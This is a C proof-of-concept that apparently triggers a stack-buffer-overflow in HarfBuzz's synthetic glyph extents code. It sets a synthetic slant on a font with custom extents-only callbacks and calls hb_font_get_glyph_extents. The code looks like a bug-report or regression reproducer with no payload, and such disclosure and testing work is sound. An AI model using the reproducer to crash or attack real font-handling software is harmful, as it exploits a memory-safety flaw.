/* PoC: stack-buffer-overflow in hb_font_t::synthetic_glyph_extents()
 * reached through the public hb_font_get_glyph_extents() API when a
 * synthetic slant is set on a font whose font-funcs only implement
 * glyph_extents (no draw/paint callbacks), with ordinary, in-contract
 * glyph extents values.
 */
#include <hb.h>
#include <stdio.h>

static hb_bool_t
my_glyph_extents (hb_font_t *font, void *font_data,
                   hb_codepoint_t glyph,
                   hb_glyph_extents_t *extents,
                   void *user_data)
{
  (void) font; (void) font_data; (void) glyph; (void) user_data;
  extents->x_bearing = 10;
  extents->y_bearing = 800;
  extents->width = 600;
  extents->height = -800;
  return true;
}

int
main (void)
{
  hb_font_funcs_t *ffuncs = hb_font_funcs_create ();
  hb_font_funcs_set_glyph_extents_func (ffuncs, my_glyph_extents, NULL, NULL);

  hb_face_t *face = hb_face_get_empty ();
  hb_font_t *font = hb_font_create (face);
  hb_font_set_funcs (font, ffuncs, NULL, NULL);
  hb_font_set_scale (font, 1000, 1000);

  hb_font_set_synthetic_slant (font, 0.3f);

  hb_glyph_extents_t extents;
  hb_bool_t ret = hb_font_get_glyph_extents (font, 42, &extents);

  printf ("ret=%d x_bearing=%d y_bearing=%d width=%d height=%d\n",
          ret, extents.x_bearing, extents.y_bearing, extents.width, extents.height);

  hb_font_destroy (font);
  hb_font_funcs_destroy (ffuncs);

  return 0;
}
